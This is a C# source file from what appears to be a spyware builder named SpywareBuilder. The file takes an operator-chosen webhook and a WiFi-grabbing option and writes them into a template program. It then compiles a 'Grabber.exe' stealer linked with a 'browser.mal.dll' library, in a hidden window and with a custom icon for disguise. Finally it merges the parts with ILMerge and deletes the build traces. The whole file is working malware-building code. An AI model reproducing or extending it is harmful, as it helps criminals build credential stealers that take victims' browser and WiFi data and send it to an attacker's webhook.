using System.IO.Compression;
using System.IO;
using SpywareBuilder.AssemblyInfo;
using System.Diagnostics;
using System;

namespace SpywareBuilder.Builder
{
    public class GeiBuilder
    {
        private static readonly string TEMP_DIRECTORY = "Properties";
        private static readonly string TEMP_FILE = "props.zip";
        private AssemblyInformationBuilder assemblyInformationBuilder;

        //public GeiBuilder() => this.mergeFiles = mergeFiles;

        public void Setup(string webhook, AssemblyData assemblyData, bool grabWifi)
        {
            if (!Directory.Exists(TEMP_DIRECTORY))
                Directory.CreateDirectory(TEMP_DIRECTORY);

            string filePath = $"{Path.Combine(TEMP_DIRECTORY, TEMP_FILE)}";
            File.WriteAllBytes(filePath, Properties.Resources.Properties);

            ExtractToPath(filePath, TEMP_DIRECTORY);

            File.WriteAllText(Path.Combine(TEMP_DIRECTORY, "Program.cs"), Properties.Resources.Program.Replace("%WEBHOOK%", webhook).Replace("%WIFI%", grabWifi.ToString().ToLower()));

            assemblyInformationBuilder = new AssemblyInformationBuilder();

            assemblyInformationBuilder.BuildAssembly(assemblyData);
            assemblyInformationBuilder.SaveAssembly(TEMP_DIRECTORY);
        }

        public void Build(string iconFile, string outputPath = "")
        {
            ProcessInvoker("cmd.exe", 
                $"/c Properties\\Roslyn\\csc.exe /noconfig /nowarn:1701,1702,2008 /fullpaths /nostdlib+ /platform:x64 /reference:Properties\\browser.mal.dll /reference:\"Properties\\Microsoft.CSharp.dll\" /reference:\"Properties\\mscorlib.dll\" /reference:\"Properties\\System.Core.dll\" /reference:\"Properties\\System.Data.DataSetExtensions.dll\" /reference:\"Properties\\System.Data.dll\" /reference:\"Properties\\System.dll\" /reference:\"Properties\\System.Net.Http.dll\" /reference:\"Properties\\System.Xml.dll\" /reference:\"Properties\\System.Xml.Linq.dll\" /filealign:512 /optimize- /out:\"{TEMP_DIRECTORY}\\Grabber.exe\" /subsystemversion:6.00 /target:winexe /utf8output /win32icon:\"{iconFile}\" /deterministic+ /langversion:7.3 Properties\\Program.cs Properties\\AssemblyInfo.cs \"Properties\\.NETFramework,Version=v4.6.1.AssemblyAttributes.cs\"", true, ProcessWindowStyle.Hidden, true);

            Merger(outputPath);
            PostBuild(outputPath);
        }

        private void PostBuild(string outputPath)
        {
            try
            {
                Directory.Delete(TEMP_DIRECTORY, true);
            }
            catch { }

            try
            {
                File.Delete(Path.Combine(outputPath, "Grabber.pdb"));
            }
            catch { }
        }

        private void ProcessInvoker(string fileName, string arguments, bool wait, ProcessWindowStyle windowStyle, bool createNoWindow)
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    WindowStyle = windowStyle,
                    FileName = fileName,
                    Arguments = arguments,
                    CreateNoWindow = createNoWindow
                }
            };

            process.Start();

            if (wait)
                process.WaitForExit();
        }

        private void ExtractToPath(string zipPath, string folderPath)
        {
            try
            {
                ZipFile.ExtractToDirectory(zipPath, folderPath);
            }
            catch (Exception)
            {

            }
        }

        private void Merger(string outputPath)
        {
            ProcessInvoker("cmd.exe", $"/c {TEMP_DIRECTORY}\\ILMerge.exe /t:winexe /out:\"{outputPath}\\Grabber.exe\" {TEMP_DIRECTORY}\\Grabber.exe {TEMP_DIRECTORY}\\browser.mal.dll", true, ProcessWindowStyle.Hidden, true);
        }
    }
}
